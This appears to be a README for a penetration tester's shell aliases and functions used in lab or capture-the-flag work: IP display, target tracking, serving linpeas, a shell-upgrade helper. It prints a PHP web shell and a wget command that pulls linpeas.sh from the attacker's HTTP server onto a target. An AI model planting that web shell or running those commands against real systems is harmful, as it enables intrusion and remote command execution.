# Scripts and Aliases

This README explains the functionality of various functions and aliases used in some scripts and commands. Here are the details for each function and alias:

## `ips()` Function

This function displays the IP addresses of network interfaces and the IP address of the configured "target". 

- The "target" is specifically used with **Polybar** to show the configured target IP.

### Example Output:
```
➜  ~ ips
[eth0] 192.168.23.129
[docker0] 172.17.0.1
[br-8db2d90e6bf0] 172.18.0.1
[tun0] 10.8.63.11
[Target] 10.10.11.15
```

## `linpeas()` Function

The `linpeas()` function helps to serve the `linpeas.sh` script to a target machine by using the local machine's IP address on the `tun0` network interface. It leverages Python's built-in HTTP server to serve the script over HTTP.

### Example Output:
```
➜  ~ linpeas
Run the following command on the target machine: wget http://10.8.63.11/linpeas.sh
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
## `upgrade()` Function

The `upgrade()` function is designed to copy a Python one-liner to the clipboard. This one-liner can be used to spawn a reverse shell using Python's `pty` module, which provides a way to interact with a terminal. The shell is opened through the `/bin/bash` shell, allowing the user to have a more interactive session.

### Example Usage:
Running `upgrade` will copy the Python reverse shell command to the clipboard. You can then paste the command into the target machine’s terminal to spawn a more interactive shell.

## `set_target()` Function

The `set_target()` function stores the IP address or hostname of a target machine. This makes it easy to track and reference the target machine for tasks like scanning or attacks. After using this function, the target information is saved persistently and can be used later.
- All target's alias and functions just work with polybar.

### Example Usage:

To save a target IP:

```bash
set_target 192.168.1.10
```

## `target` Alias

The `target` alias is a shortcut that allows you to quickly copy the stored target IP address or hostname to the clipboard. This makes it easy to paste the target wherever needed, such as in commands or configuration files.


### Example Usage:

After saving a target with the `set_target()` function, you can use the `target` alias to copy the target to the clipboard


## `tun0` Alias

The `tun0` alias is used to extract the IP address of the `tun0` network interface (typically associated with VPNs) and copy it to the clipboard. This is useful for quickly obtaining the IP address assigned to the `tun0` interface.

### Example Usage:

Running the alias will copy the `tun0` IP address to the clipboard

## `server` Alias

The `server` alias starts a simple HTTP server using Python on port 80. It is commonly used for quickly serving files or setting up a local server.

## `phpcmd` Alias

The `phpcmd` alias generates a basic PHP web shell script.

Running the alias creates a file called `webshell.php` with the following PHP code:

```php
<?php system($_GET["cmd"]); ?>
```
